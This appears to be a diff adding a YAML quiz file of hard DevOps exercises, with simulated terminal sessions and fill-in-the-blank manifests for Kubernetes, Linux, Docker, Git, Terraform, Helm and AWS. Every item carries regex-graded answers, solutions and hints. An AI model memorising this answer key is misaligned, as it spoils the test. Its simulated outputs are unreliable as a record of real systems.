@@ -1,0 +1,1167 @@
+# HARD — live sessions: type commands in a simulated terminal, complete manifests, spot bugs.
+# Terminal `accept` / `match` entries are either a JS-compatible regex string or
+#   { all: [regex, ...], none: [regex, ...] }  → every `all` must appear somewhere, no `none` may appear.
+# Commands are normalised first: trimmed, spaces collapsed, leading `$ ` / `sudo ` removed, `k ` → `kubectl `.
+level: hard
+questions:
+
+# ------------------------------------------------------------------ LIVE TERMINAL
+- id: h-term-k8s-001
+  category: Kubernetes
+  type: terminal
+  title: "Live: bad release in payments"
+  host: oncall@eks-prod
+  prompt: "oncall@eks-prod:~$"
+  scenario: "Context is already set to cluster `prod-eu`, namespace `payments`. The release of `payments-api` 12 minutes ago is crash-looping. Find the cause, restore service, and verify."
+  motd: |
+    Last login: Mon Nov 16 10:12:44 2026 from 10.8.0.14
+    kubectl context: prod-eu (namespace: payments)
+  explore:
+    - match: { all: ["^kubectl ", "\\bget\\b", "\\b(po|pod|pods)\\b"] }
+      output: |
+        NAME                            READY   STATUS             RESTARTS      AGE
+        payments-api-6c9f7d8b5-2xkqp    0/1     CrashLoopBackOff   7 (20s ago)   12m
+        payments-api-6c9f7d8b5-h7r4m    0/1     CrashLoopBackOff   7 (35s ago)   12m
+        payments-api-5b7d9c4f8-lq2zt    1/1     Running            0             3d
+    - match: { all: ["^kubectl ", "\\bdescribe\\b", "payments-api"] }
+      output: |
+        Containers:
+          api:
+            Image:          123456789012.dkr.ecr.eu-central-1.amazonaws.com/payments-api:2.9.0
+            State:          Waiting
+              Reason:       CrashLoopBackOff
+            Last State:     Terminated
+              Reason:       Error
+              Exit Code:    1
+        Events:
+          Warning  BackOff  20s (x31 over 12m)  kubelet  Back-off restarting failed container api
+    - match: { all: ["^kubectl ", "\\brollout\\b", "\\bhistory\\b"] }
+      output: |
+        deployment.apps/payments-api
+        REVISION  CHANGE-CAUSE
+        13        payments-api:2.8.4
+        14        payments-api:2.9.0
+    - match: { all: ["^kubectl ", "\\blogs\\b"], none: ["(\\s-p\\b|--previous)"] }
+      output: |
+        Error from server (BadRequest): container "api" in pod "payments-api-6c9f7d8b5-2xkqp" is waiting to start: CrashLoopBackOff
+  steps:
+    - task: "Read the logs of the **crashed** container instance of pod `payments-api-6c9f7d8b5-2xkqp`."
+      accept:
+        - { all: ["^kubectl ", "\\blogs\\b", "payments-api-6c9f7d8b5-2xkqp", "(\\s-p\\b|--previous)"] }
+      solution: kubectl logs payments-api-6c9f7d8b5-2xkqp --previous
+      hint: The current container hasn't started yet. There's a flag for the previous instance.
+      output: |
+        2026-11-16T06:14:02Z INFO  starting payments-api v2.9.0
+        2026-11-16T06:14:02Z INFO  loading config from env
+        2026-11-16T06:14:02Z FATAL config: required variable LEDGER_GRPC_ENDPOINT is not set
+    - task: "The new version needs config that doesn't exist yet. Roll `payments-api` back to the previous revision."
+      accept:
+        - { all: ["^kubectl ", "\\brollout\\b", "\\bundo\\b", "(deploy|deployment|deployments)(\\.apps)?[/ ]payments-api"] }
+      solution: kubectl rollout undo deployment/payments-api
+      hint: "`kubectl rollout ...` has a sub-command that goes back one revision."
+      wrong:
+        - match: "rollout restart"
+          output: "deployment.apps/payments-api restarted"
+        - match: "delete (po|pod|pods)"
+          output: pod "payments-api-6c9f7d8b5-2xkqp" deleted
+      output: "deployment.apps/payments-api rolled back"
+    - task: "Verify the rollout finished successfully."
+      accept:
+        - { all: ["^kubectl ", "\\brollout\\b", "\\bstatus\\b", "payments-api"] }
+      solution: kubectl rollout status deployment/payments-api
+      hint: Same `rollout` family — ask for its status.
+      output: |
+        Waiting for deployment "payments-api" rollout to finish: 1 old replicas are pending termination...
+        deployment "payments-api" successfully rolled out
+  explanation: "Use `logs --previous` to read the crash, `rollout undo` to restore the last good ReplicaSet, and `rollout status` to confirm. The real fix ships with the release: the new env var (from a ConfigMap or External Secret) must exist **before** the image that needs it. Also, `rollout restart` just restarts the broken version."
+
+- id: h-term-linux-001
+  category: Linux
+  type: terminal
+  title: "Live: /var is 100% full"
+  host: root@pay-app-03
+  prompt: "root@pay-app-03:~#"
+  scenario: "PagerDuty: `DiskFull /var on pay-app-03`. The app must stay up (no restarts during business hours). Free the space and confirm."
+  explore:
+    - match: "^du\\b"
+      output: |
+        12G     /var
+    - match: "^ls\\b.*\\/var\\/log\\/app"
+      output: |
+        -rw-r----- 1 app app 2.1G Nov 16 10:20 app.log.1
+        -rw-r----- 1 app app 112M Nov 16 10:41 app.log
+    - match: "^ps\\b"
+      output: |
+        app       2211  6.2 18.1 4823112 1490212 ?  Ssl  Nov04 1088:21 java -jar /opt/app/app.jar
+  steps:
+    - task: "Confirm which filesystem is full (human-readable)."
+      accept: ["^df\\b.*-\\w*h"]
+      solution: df -h
+      hint: "Use the disk-free command with the human-readable flag."
+      output: |
+        Filesystem      Size  Used Avail Use% Mounted on
+        /dev/nvme0n1p1   20G  6.1G   14G  31% /
+        /dev/nvme1n1     50G   50G     0 100% /var
+    - task: "`du` only finds 12G. Find files that were **deleted but are still held open** by a process."
+      accept:
+        - "^lsof\\b.*\\+L ?1"
+        - "^lsof\\b.*\\|\\s*grep\\b.*(deleted|DEL)"
+        - "^find /proc/\\S*/fd .*-lname .*deleted"
+      solution: lsof +L1
+      tool: lsof
+      hint: "`lsof` can list open files with a link count below 1."
+      output: |
+        COMMAND   PID USER  FD  TYPE DEVICE    SIZE/OFF NLINK  NODE NAME
+        java     2211 app   45w  REG  259,1 40265318400     0  1311 /var/log/app/app.log.2026-11-01 (deleted)
+    - task: "Free the 40 GB **without restarting** PID 2211 (it holds the file on fd 45)."
+      accept:
+        - "^(:|true|echo -n|cat /dev/null) ?>\\s*/proc/2211/fd/45$"
+        - "^truncate -s ?0 /proc/2211/fd/45$"
+        - "^>\\s*/proc/2211/fd/45$"
+      solution: ": > /proc/2211/fd/45"
+      tool: truncate
+      hint: Truncate the file through the process's file-descriptor path under /proc.
+      wrong:
+        - match: "^kill\\b"
+          output: "# that would take the payments app down — not allowed during business hours"
+        - match: "^rm\\b"
+          output: "rm: cannot remove: the file is already unlinked; space is held by the open descriptor"
+      output: ""
+    - task: "Verify the space is back."
+      accept: ["^df\\b.*-\\w*h"]
+      solution: df -h /var
+      output: |
+        Filesystem      Size  Used Avail Use% Mounted on
+        /dev/nvme1n1     50G   11G   39G  22% /var
+  explanation: "Disk space is freed only when every open descriptor closes. Someone `rm`'d a log that the JVM still writes to. Truncating through `/proc/<pid>/fd/<n>` frees it live. The permanent fix is logrotate with `copytruncate` (or a reopen signal), plus alerting on `node_filesystem_avail_bytes` trends."
+
+- id: h-term-docker-001
+  category: Docker
+  type: terminal
+  title: "Live: container exits immediately"
+  host: dev@build-01
+  prompt: "dev@build-01:~$"
+  scenario: "You started `acme/api:1.2` as container `api` with `-p 8080:8080`, but it isn't running."
+  explore:
+    - match: "^docker (images|image ls)"
+      output: |
+        REPOSITORY   TAG   IMAGE ID       CREATED       SIZE
+        acme/api     1.2   9f1c2a7b3d4e   2 hours ago   38.2MB
+    - match: "^docker ps$"
+      output: "CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES"
+  steps:
+    - task: "List **all** containers, including stopped ones."
+      accept: ["^docker (ps|container ls) .*(-a\\b|--all)"]
+      solution: docker ps -a
+      hint: "`docker ps` hides stopped containers unless you ask for all of them."
+      output: |
+        CONTAINER ID   IMAGE          COMMAND      CREATED          STATUS                     PORTS   NAMES
+        3b9e1f0c2a11   acme/api:1.2   "/app"       40 seconds ago   Exited (1) 38 seconds ago          api
+    - task: "Read the logs of container `api`."
+      accept: ["^docker (container )?logs .*\\b(api|3b9e1f0c2a11)\\b"]
+      solution: docker logs api
+      output: |
+        {"level":"fatal","msg":"listen tcp :8080: bind: address already in use"}
+    - task: "Find which process on the host is already listening on port 8080."
+      accept:
+        - { all: ["^ss ", "-\\w*l", "-\\w*p", "8080"] }
+        - "^ss -\\w*l\\w*p\\w*( \\S+)* ?\\| ?grep :?8080"
+        - "^lsof -i ?(tcp)?:8080"
+        - "^(fuser|fuser -v) 8080/tcp"
+        - "^netstat -\\w*l\\w*p.*8080"
+      solution: ss -ltnp 'sport = :8080'
+      tool: ss
+      hint: "`ss -ltnp` lists listening TCP sockets with their processes. Filter it for 8080."
+      output: |
+        State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
+        LISTEN 0      4096         0.0.0.0:8080       0.0.0.0:*     users:(("java",pid=1720,fd=9))
+    - task: "Keep that legacy java process. Remove the dead `api` container so the name is free."
+      accept: ["^docker (container )?rm (-f |--force )?(api|3b9e1f0c2a11)$"]
+      solution: docker rm api
+      hint: "Stopped containers keep their name until you remove them."
+      output: "api"
+    - task: "Run `acme/api:1.2` detached as `api`, publishing host port **8081** to container port 8080."
+      accept:
+        - { all: ["^docker run ", "(-d\\b|--detach)", "(-p|--publish)[ =]?8081:8080", "--name[ =]api\\b", "acme/api:1\\.2"] }
+      solution: docker run -d --name api -p 8081:8080 acme/api:1.2
+      hint: "`-p HOST:CONTAINER` — the host side is what changes."
+      wrong:
+        - match: "8080:8080"
+          output: "docker: Error response from daemon: driver failed programming external connectivity: Bind for 0.0.0.0:8080 failed: port is already allocated."
+        - match: "8080:8081"
+          output: "5c7d2e9a8f1b...   # started, but nothing listens on container port 8081"
+      output: |
+        5c7d2e9a8f1b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d
+  explanation: "`docker ps -a` shows exited containers, `docker logs` shows why they exited, and `ss -ltnp` shows who holds the port. Publish a different **host** port; the container port stays 8080."
+
+- id: h-term-git-001
+  category: Git
+  type: terminal
+  title: "Live: I deleted the wrong branch"
+  host: you@laptop
+  prompt: "you@laptop:~/payments$"
+  scenario: "You ran `git branch -D feature/settlement-v2` by mistake. It was never pushed and contains 3 days of work. Recover it."
+  explore:
+    - match: "^git status"
+      output: |
+        On branch main
+        Your branch is up to date with 'origin/main'.
+    - match: "^git branch$"
+      output: "* main"
+    - match: "^git log"
+      output: |
+        e41d0a2 (HEAD -> main, origin/main) chore: bump deps
+        77c1f3b feat: refunds API
+  steps:
+    - task: "Find the commit the deleted branch pointed to (Git keeps a log of where HEAD has been)."
+      accept: ["^git reflog", "^git log -g", "^git log --walk-reflogs"]
+      solution: git reflog
+      hint: Every move of HEAD is recorded in the *ref*erence *log*.
+      output: |
+        e41d0a2 (HEAD -> main) HEAD@{0}: checkout: moving from feature/settlement-v2 to main
+        9ac3b71 HEAD@{1}: commit: feat(settlement): idempotent batch close
+        51fe2d0 HEAD@{2}: commit: feat(settlement): new netting engine
+        3d18c45 HEAD@{3}: checkout: moving from main to feature/settlement-v2
+    - task: "Recreate `feature/settlement-v2` at the right commit."
+      accept:
+        - "^git (branch|switch -c|switch --create|checkout -b) feature/settlement-v2 (9ac3b71|HEAD@\\{1\\})"
+      solution: git branch feature/settlement-v2 9ac3b71
+      hint: "The newest commit made on that branch is the one right before you checked out main."
+      wrong:
+        - match: "51fe2d0|3d18c45"
+          output: "# that commit is older — you'd lose the latest work"
+      output: ""
+    - task: "Push it to origin and set upstream so this can't happen again."
+      accept:
+        - { all: ["^git push", "(-u|--set-upstream)", "origin", "feature/settlement-v2"] }
+      solution: git push -u origin feature/settlement-v2
+      output: |
+        To github.com:acme/payments.git
+         * [new branch]      feature/settlement-v2 -> feature/settlement-v2
+        branch 'feature/settlement-v2' set up to track 'origin/feature/settlement-v2'.
+  explanation: "Deleted branches are just deleted *pointers*. Commits stay reachable through the reflog (90 days by default) until `git gc`. `git branch <name> <sha>` brings the branch back. Push early, push often."
+
+- id: h-term-tf-001
+  category: Terraform
+  type: terminal
+  title: "Live: adopt a hand-made bucket"
+  host: ci@runner
+  prompt: "ci@runner:~/infra/prod$"
+  scenario: "An S3 bucket `acme-audit-logs-prod` was created in the console. Its config already exists in `s3.tf` as `aws_s3_bucket.audit_logs`, but `terraform plan` wants to **create** it (and would fail with BucketAlreadyOwnedByYou)."
+  explore:
+    - match: "^terraform plan"
+      output: |
+        # aws_s3_bucket.audit_logs will be created
+        + resource "aws_s3_bucket" "audit_logs" {
+            + bucket = "acme-audit-logs-prod"
+          }
+        Plan: 1 to add, 0 to change, 0 to destroy.
+    - match: "^cat s3\\.tf"
+      output: |
+        resource "aws_s3_bucket" "audit_logs" {
+          bucket = "acme-audit-logs-prod"
+        }
+    - match: "^terraform state list"
+      output: |
+        aws_s3_bucket.app_assets
+        aws_iam_role.app
+  steps:
+    - task: "Import the existing bucket into state at address `aws_s3_bucket.audit_logs` (CLI import)."
+      accept:
+        - "^terraform import '?aws_s3_bucket\\.audit_logs'? acme-audit-logs-prod$"
+      solution: terraform import aws_s3_bucket.audit_logs acme-audit-logs-prod
+      hint: "`terraform import <address> <id>` — for S3 buckets the ID is the bucket name."
+      wrong:
+        - match: "arn:aws:s3"
+          output: "Error: Cannot import non-existent remote object — for aws_s3_bucket the import ID is the bucket name, not the ARN"
+      output: |
+        aws_s3_bucket.audit_logs: Importing from ID "acme-audit-logs-prod"...
+        aws_s3_bucket.audit_logs: Import prepared!
+        aws_s3_bucket.audit_logs: Refreshing state... [id=acme-audit-logs-prod]
+        Import successful!
+    - task: "Prove that config and reality now match."
+      accept: ["^terraform plan"]
+      solution: terraform plan
+      output: |
+        aws_s3_bucket.audit_logs: Refreshing state... [id=acme-audit-logs-prod]
+        No changes. Your infrastructure matches the configuration.
+  explanation: "`terraform import` binds an existing object to a resource address. In Terraform ≥1.5 prefer an `import {}` block, which is reviewable in a PR and can generate config with `-generate-config-out`. Then add guardrails such as SCPs or tag policies so console-created prod resources get noticed."
+
+- id: h-term-k8s-002
+  category: Kubernetes
+  type: terminal
+  title: "Live: who can read secrets?"
+  host: secops@eks-prod
+  prompt: "secops@eks-prod:~$"
+  scenario: "A PCI pre-audit asks: can the CI ServiceAccount `deployer` in namespace `ci` read Secrets in `prod`? It must NOT."
+  explore:
+    - match: "^kubectl get (sa|serviceaccounts?) .*-n ci"
+      output: |
+        NAME       SECRETS   AGE
+        default    0         210d
+        deployer   0         210d
+  steps:
+    - task: "Check whether `system:serviceaccount:ci:deployer` can `get secrets` in namespace `prod`."
+      accept:
+        - { all: ["^kubectl auth can-i", "\\bget\\b", "\\bsecrets?\\b", "--as[ =]system:serviceaccount:ci:deployer", "(-n|--namespace)[ =]?prod"] }
+      solution: kubectl auth can-i get secrets -n prod --as system:serviceaccount:ci:deployer
+      hint: "`kubectl auth can-i VERB RESOURCE -n NS --as USER`"
+      output: "yes"
+    - task: "Find the binding that grants it (search role and cluster role bindings for `deployer`)."
+      accept:
+        - { all: ["^kubectl get ", "clusterrolebindings?", "(grep|-o wide|-o yaml|-o json|jq)"] }
+      solution: kubectl get rolebindings,clusterrolebindings -A -o wide | grep deployer
+      tool: kubectl get
+      hint: "`kubectl get clusterrolebindings -o wide` shows subjects. Pipe it to grep."
+      output: |
+        clusterrolebinding.rbac.authorization.k8s.io/deployer-admin   ClusterRole/cluster-admin   210d   ci/deployer
+    - task: "Remove that over-privileged binding."
+      accept:
+        - "^kubectl delete (clusterrolebindings?)(\\.rbac\\.authorization\\.k8s\\.io)?[/ ]deployer-admin$"
+      solution: kubectl delete clusterrolebinding deployer-admin
+      output: clusterrolebinding.rbac.authorization.k8s.io "deployer-admin" deleted
+    - task: "Re-run the check to prove access is gone."
+      accept:
+        - { all: ["^kubectl auth can-i", "secrets?", "system:serviceaccount:ci:deployer", "prod"] }
+      solution: kubectl auth can-i get secrets -n prod --as system:serviceaccount:ci:deployer
+      output: "no"
+  explanation: "`auth can-i --as` is the fastest RBAC audit, and `kubectl auth can-i --list --as ...` shows everything an identity can do. `cluster-admin` for CI is a top audit finding. Replace it with a namespaced Role scoped to the resources the deployer applies — or better, let Argo CD deploy and give CI no cluster access at all."
+
+- id: h-term-linux-002
+  category: Linux
+  type: terminal
+  title: "Live: systemd service won't start"
+  host: root@edge-02
+  prompt: "root@edge-02:~#"
+  scenario: "After a deploy, `api.service` is failed. Get it running."
+  explore:
+    - match: "^cat /etc/systemd/system/api\\.service"
+      output: |
+        [Unit]
+        Description=Acme API
+        After=network-online.target
+        [Service]
+        User=api
+        ExecStart=/opt/api/bin/api --config /etc/api/config.yaml
+        Restart=on-failure
+        [Install]
+        WantedBy=multi-user.target
+    - match: "^file /opt/api/bin/api"
+      output: "/opt/api/bin/api: ELF 64-bit LSB executable, x86-64, statically linked"
+    - match: "^uname -m"
+      output: "x86_64"
+    - match: "^systemctl status api"
+      output: |
+        × api.service - Acme API
+             Active: failed (Result: exit-code) since Mon 2026-11-16 10:01:22 +04
+  steps:
+    - task: "Show the service status."
+      accept: ["^systemctl status api(\\.service)?"]
+      solution: systemctl status api
+      output: |
+        × api.service - Acme API
+             Active: failed (Result: exit-code) since Mon 2026-11-16 10:01:22 +04
+            Process: 9812 ExecStart=/opt/api/bin/api --config /etc/api/config.yaml (code=exited, status=203/EXEC)
+    - task: "Read the unit's journal to see why exec failed."
+      accept: ["^journalctl\\b.*(-u ?|--unit[ =]|-\\w*u )api\\b", "^journalctl -\\w*u ?api"]
+      solution: journalctl -u api -b
+      tool: journalctl
+      hint: "`journalctl -u <unit>` with `-b` for the current boot."
+      output: |
+        Nov 16 10:01:22 edge-02 systemd[9812]: api.service: Failed to execute /opt/api/bin/api: Permission denied
+        Nov 16 10:01:22 edge-02 systemd[9812]: api.service: Failed at step EXEC spawning /opt/api/bin/api: Permission denied
+    - task: "Check the binary's permissions."
+      accept: ["^(ls -\\w*l\\w*|stat) /opt/api/bin/api"]
+      solution: ls -l /opt/api/bin/api
+      tool: ls
+      output: "-rw-r--r-- 1 root root 18874368 Nov 16 09:58 /opt/api/bin/api"
+    - task: "Make the binary executable (keep root as owner)."
+      accept: ["^chmod (\\+x|a\\+x|ugo\\+x|0?755|0?750|0?775) /opt/api/bin/api$"]
+      solution: chmod 755 /opt/api/bin/api
+      tool: chmod
+      hint: The execute bit is missing.
+      wrong:
+        - match: "^chmod 0?777"
+          output: "# works, but world-writable binaries run by systemd are a privilege-escalation risk"
+      output: ""
+    - task: "Restart the service and confirm it is running."
+      accept: ["^systemctl restart api(\\.service)?( && systemctl status api(\\.service)?)?$", "^systemctl (start|restart) api"]
+      solution: systemctl restart api && systemctl status api
+      output: |
+        ● api.service - Acme API
+             Active: active (running) since Mon 2026-11-16 10:09:51 +04; 2s ago
+           Main PID: 10233 (api)
+  explanation: "A 203/EXEC status comes from systemd before your code runs. The journal said `Permission denied`, and `ls -l` showed no `x` bit — a deploy that copies artifacts without preserving modes is a classic cause. Use `install -m 0755` in the deploy step, or ship a package."
+
+- id: h-term-helm-001
+  category: Kubernetes
+  type: terminal
+  title: "Live: Helm upgrade broke checkout"
+  host: oncall@eks-prod
+  prompt: "oncall@eks-prod:~$"
+  scenario: "`helm upgrade checkout ...` in namespace `shop` (revision 42) broke checkout. Revision 41 was healthy. Roll back."
+  steps:
+    - task: "Show the release history of `checkout` in namespace `shop`."
+      accept: [{ all: ["^helm (history|hist)\\b", "checkout", "(-n|--namespace)[ =]?shop"] }]
+      solution: helm history checkout -n shop
+      hint: "`helm history <release> -n <ns>`"
+      wrong:
+        - match: "^helm (history|hist) checkout$"
+          output: "Error: release: not found   # wrong namespace?"
+      output: |
+        REVISION  UPDATED                   STATUS      CHART           APP VERSION  DESCRIPTION
+        40        Thu Nov 12 09:01:11 2026  superseded  checkout-3.4.0  3.4.0        Upgrade complete
+        41        Fri Nov 13 14:22:05 2026  superseded  checkout-3.4.1  3.4.1        Upgrade complete
+        42        Mon Nov 16 10:05:44 2026  deployed    checkout-3.5.0  3.5.0        Upgrade complete
+    - task: "Roll back to revision 41 and wait for resources to be ready."
+      accept: [{ all: ["^helm rollback checkout 41", "(-n|--namespace)[ =]?shop", "--wait"] }]
+      solution: helm rollback checkout 41 -n shop --wait
+      hint: "`helm rollback <release> <revision> -n <ns> --wait`"
+      wrong:
+        - match: { all: ["^helm rollback checkout 41"], none: ["--wait"] }
+          output: "Rollback was a success! Happy Helming!   # …but it didn't wait for readiness (task asks for --wait)"
+      output: "Rollback was a success! Happy Helming!"
+  explanation: "`helm rollback` creates a **new** revision (43) with 41's manifests. `--wait` blocks until resources are ready, so you know it worked. If Argo CD or Flux manages the release, roll back in Git instead, or the controller will re-apply 42."
+
+- id: h-term-aws-001
+  category: AWS
+  type: terminal
+  title: "Live: who deleted the bucket policy?"
+  host: secops@cloudshell
+  prompt: "[cloudshell-user@ip-10-1-2-3 ~]$"
+  scenario: "Overnight, the bucket policy on `acme-card-exports` (PCI scope) disappeared. Find out who did it, from where."
+  explore:
+    - match: "^aws s3api get-bucket-policy"
+      output: "An error occurred (NoSuchBucketPolicy) when calling the GetBucketPolicy operation: The bucket policy does not exist"
+  steps:
+    - task: "Confirm which identity your CLI is using."
+      accept: ["^aws sts get-caller-identity"]
+      solution: aws sts get-caller-identity
+      output: |
+        { "UserId": "AROA...:yousaf", "Account": "111122223333", "Arn": "arn:aws:sts::111122223333:assumed-role/SecOpsAudit/yousaf" }
+    - task: "Search CloudTrail management events for the `DeleteBucketPolicy` API call."
+      accept:
+        - { all: ["^aws cloudtrail lookup-events", "--lookup-attributes", "AttributeKey=EventName", "AttributeValue=DeleteBucketPolicy"] }
+      solution: aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=DeleteBucketPolicy
+      hint: "`lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=...`"
+      output: |
+        {
+          "Events": [{
+            "EventName": "DeleteBucketPolicy",
+            "EventTime": "2026-11-16T01:47:12+00:00",
+            "Username": "temp-contractor",
+            "Resources": [{ "ResourceType": "AWS::S3::Bucket", "ResourceName": "acme-card-exports" }],
+            "CloudTrailEvent": "{\"sourceIPAddress\":\"203.0.113.77\",\"userAgent\":\"aws-cli/2.17.0\",\"userIdentity\":{\"type\":\"IAMUser\",\"accessKeyId\":\"AKIAEXAMPLE7Q\"}}"
+          }]
+        }
+    - task: "Contain it: deactivate that user's access key `AKIAEXAMPLE7Q`."
+      accept:
+        - { all: ["^aws iam update-access-key", "--access-key-id[ =]AKIAEXAMPLE7Q", "--status[ =]Inactive", "--user-name[ =]temp-contractor"] }
+      solution: aws iam update-access-key --user-name temp-contractor --access-key-id AKIAEXAMPLE7Q --status Inactive
+      hint: "`aws iam update-access-key --user-name ... --access-key-id ... --status Inactive`"
+      wrong:
+        - match: "delete-access-key"
+          output: "# deleting destroys evidence and can't be undone — deactivate first"
+      output: ""
+  explanation: "`lookup-events` covers 90 days of management events — use Athena or CloudTrail Lake for longer windows and org-wide trails. Deactivate rather than delete, to preserve the evidence. Then restore the policy from IaC and add an SCP, Config rule or EventBridge alert on `DeleteBucketPolicy` for PCI buckets."
+
+# ------------------------------------------------------------------ FILL THE MANIFEST
+- id: h-fill-k8s-001
+  category: Kubernetes
+  type: fill
+  title: "Manifest: production-ready Deployment"
+  scenario: "Complete the Deployment for `ledger` (port **8080**, health at **/healthz**). Pods must only get traffic when ready."
+  lang: yaml
+  template: |
+    apiVersion: {{api}}
+    kind: Deployment
+    metadata:
+      name: ledger
+    spec:
+      replicas: 3
+      selector:
+        matchLabels:
+          app: ledger
+      template:
+        metadata:
+          labels:
+            app: {{label}}
+        spec:
+          containers:
+            - name: ledger
+              image: ghcr.io/acme/ledger@sha256:4b1f...
+              ports:
+                - containerPort: {{port}}
+              {{probe}}:
+                httpGet:
+                  path: /healthz
+                  port: 8080
+              resources:
+                requests: { cpu: 250m, memory: 512Mi }
+                limits: { memory: 512Mi }
+  blanks:
+    api:   { accept: ["^apps/v1$"], solution: apps/v1 }
+    label: { accept: ["^ledger$", "^\"ledger\"$"], solution: ledger, width: 8 }
+    port:  { accept: ["^8080$"], solution: "8080", width: 5 }
+    probe: { accept: ["^readinessProbe$"], solution: readinessProbe, width: 15 }
+  explanation: "Deployments are `apps/v1`. The template labels must match `spec.selector.matchLabels`, or the API rejects the object. `readinessProbe` gates traffic, while a `livenessProbe` would restart the container. Setting memory request = limit gives predictable OOM behaviour, and many teams omit CPU limits to avoid throttling."
+
+- id: h-fill-k8s-002
+  category: Kubernetes
+  type: fill
+  title: "Manifest: default-deny + allow ingress controller"
+  scenario: "In namespace `payments`, deny all inbound traffic except from Pods in the `ingress-nginx` namespace on TCP 8080."
+  lang: yaml
+  template: |
+    apiVersion: networking.k8s.io/v1
+    kind: NetworkPolicy
+    metadata:
+      name: allow-from-ingress
+      namespace: payments
+    spec:
+      podSelector: {{selector}}
+      policyTypes:
+        - {{ptype}}
+      ingress:
+        - from:
+            - namespaceSelector:
+                matchLabels:
+                  {{nslabel}}: ingress-nginx
+          ports:
+            - protocol: TCP
+              port: 8080
+  blanks:
+    selector: { accept: ["^\\{\\s*\\}$"], solution: "{}", width: 4, placeholder: "?" }
+    ptype:    { accept: ["^Ingress$"], solution: Ingress, width: 8 }
+    nslabel:  { accept: ["^kubernetes\\.io/metadata\\.name$"], solution: kubernetes.io/metadata.name, width: 28 }
+  explanation: "An empty `podSelector: {}` selects every Pod in the namespace. Listing `Ingress` in policyTypes makes inbound default-deny, except what the rules allow. Every namespace automatically gets the immutable `kubernetes.io/metadata.name` label, which is safe to select on. Remember the CNI must enforce NetworkPolicy — VPC CNI needs network policy enabled."
+
+- id: h-fill-cicd-001
+  category: CI/CD
+  type: fill
+  title: "Workflow: deploy to AWS with OIDC (no keys)"
+  lang: yaml
+  template: |
+    name: deploy
+    on:
+      push:
+        branches: [main]
+    permissions:
+      contents: read
+      {{perm}}: write
+    jobs:
+      deploy:
+        runs-on: ubuntu-latest
+        environment: prod
+        steps:
+          - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+          - uses: aws-actions/configure-aws-credentials@v4
+            with:
+              {{input}}: arn:aws:iam::111122223333:role/gha-deploy-prod
+              aws-region: eu-central-1
+          - run: aws sts get-caller-identity
+  blanks:
+    perm:  { accept: ["^id-token$"], solution: id-token, width: 9 }
+    input: { accept: ["^role-to-assume$"], solution: role-to-assume, width: 15 }
+  explanation: "`id-token: write` lets the job request a GitHub OIDC token, and `role-to-assume` exchanges it for short-lived STS credentials. Pair this with a trust policy whose `sub` is pinned to `repo:acme/app:environment:prod`, plus required reviewers on the `prod` environment."
+
+- id: h-fill-tf-001
+  category: Terraform
+  type: fill
+  title: "HCL: S3 backend with native locking"
+  scenario: "Terraform ≥ 1.10. Store state in `acme-tfstate`, encrypted, with S3-native locking (no DynamoDB)."
+  lang: hcl
+  template: |
+    terraform {
+      required_version = ">= 1.10"
+      backend "{{type}}" {
+        bucket       = "acme-tfstate"
+        key          = "prod/network.tfstate"
+        region       = "eu-central-1"
+        encrypt      = {{enc}}
+        {{lock}} = true
+      }
+    }
+  blanks:
+    type: { accept: ["^s3$"], solution: s3, width: 4 }
+    enc:  { accept: ["^true$"], solution: "true", width: 5 }
+    lock: { accept: ["^use_lockfile$"], solution: use_lockfile, width: 13 }
+  explanation: "Since Terraform 1.10 the S3 backend can lock with a `.tflock` object (`use_lockfile = true`), and `dynamodb_table` is deprecated. Enable bucket versioning to recover from bad writes, and block public access."
+
+- id: h-fill-docker-001
+  category: Docker
+  type: fill
+  title: "Dockerfile: multi-stage, non-root"
+  lang: dockerfile
+  template: |
+    FROM golang:1.23 {{as}} build
+    WORKDIR /src
+    COPY go.mod go.sum ./
+    RUN go mod download
+    COPY . .
+    RUN CGO_ENABLED=0 go build -ldflags="-s -w" -o /out/api ./cmd/api
+
+    FROM gcr.io/distroless/static-debian12
+    COPY {{from}} /out/api /api
+    {{user}} nonroot:nonroot
+    ENTRYPOINT ["/api"]
+  blanks:
+    as:   { accept: ["^(AS|as)$"], solution: AS, width: 3 }
+    from: { accept: ["^--from=build$"], solution: --from=build, width: 13 }
+    user: { accept: ["^USER$"], solution: USER, width: 5 }
+  explanation: "Name the builder stage (`AS build`) and copy only the binary into the runtime image with `COPY --from=build`. Distroless images provide a `nonroot` user (UID 65532), and the exec-form ENTRYPOINT makes the binary PID 1 so signals arrive."
+
+- id: h-fill-k8s-003
+  category: Kubernetes
+  type: fill
+  title: "Manifest: HPA on CPU"
+  scenario: "Scale Deployment `api` between 3 and 20 replicas, targeting 65% average CPU utilisation."
+  lang: yaml
+  template: |
+    apiVersion: autoscaling/{{ver}}
+    kind: HorizontalPodAutoscaler
+    metadata:
+      name: api
+    spec:
+      scaleTargetRef:
+        apiVersion: apps/v1
+        kind: {{kind}}
+        name: api
+      minReplicas: 3
+      maxReplicas: 20
+      metrics:
+        - type: Resource
+          resource:
+            name: cpu
+            target:
+              type: Utilization
+              {{field}}: 65
+  blanks:
+    ver:   { accept: ["^v2$"], solution: v2, width: 3 }
+    kind:  { accept: ["^Deployment$"], solution: Deployment, width: 11 }
+    field: { accept: ["^averageUtilization$"], solution: averageUtilization, width: 19 }
+  explanation: "`autoscaling/v2` is the stable API (v2beta2 has been removed). Utilisation is relative to the container's CPU **request**. Add `behavior.scaleDown.stabilizationWindowSeconds` to avoid flapping."
+
+- id: h-fill-aws-001
+  category: AWS
+  type: fill
+  title: "IAM: least-privilege read of one prefix"
+  scenario: "The reporting role may only **read objects** under `s3://acme-reports/monthly/`."
+  lang: json
+  template: |
+    {
+      "Version": "2012-10-17",
+      "Statement": [{
+        "Effect": "Allow",
+        "Action": "{{action}}",
+        "Resource": "arn:aws:s3:::acme-reports/{{prefix}}"
+      }]
+    }
+  blanks:
+    action: { accept: ["^s3:GetObject$"], solution: s3:GetObject, width: 13 }
+    prefix: { accept: ["^monthly/\\*$"], solution: monthly/*, width: 10 }
